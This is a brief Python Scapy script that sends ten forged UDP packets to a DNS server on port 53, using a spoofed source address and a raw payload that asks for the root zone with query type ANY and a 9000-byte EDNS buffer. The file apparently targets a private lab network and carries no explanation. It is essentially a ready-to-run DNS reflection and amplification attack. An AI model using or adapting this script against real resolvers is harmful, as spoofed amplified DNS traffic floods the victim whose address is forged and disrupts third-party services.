from scapy.all import *
import time
send(IP(src="192.168.30.1", dst="192.168.20.1") / UDP(sport=16863, dport=53) / "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00\x29\x23\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", count=10)